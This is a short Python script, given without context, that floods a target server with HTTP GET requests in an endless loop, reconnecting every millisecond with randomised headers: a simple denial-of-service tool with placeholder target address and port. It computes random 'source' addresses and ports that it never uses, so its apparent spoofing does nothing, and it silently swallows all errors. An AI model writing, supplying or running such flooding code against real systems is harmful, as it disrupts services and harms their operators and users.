import socket
import random
import time

target_ip = "10.0.0.1"  # Replace with the IP address of the target server
target_port = 80  # Replace with the port number of the target service

def flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(0.5)
    source_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    source_port = random.randint(1024, 65535)
    try:
        s.connect((target_ip, target_port))
        s.sendall("GET / HTTP/1.1\r\n".encode())
        s.sendall(("Host: " + target_ip + "\r\n").encode())
        s.sendall(("X-a: " + str(random.randint(1, 100000)) + "\r\n").encode())
        s.sendall("Connection: keep-alive\r\n".encode())
        s.sendall("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n".encode())
        s.sendall("\r\n".encode())
    except:
        pass
    s.close()

while True:
    flood()
    time.sleep(0.001)
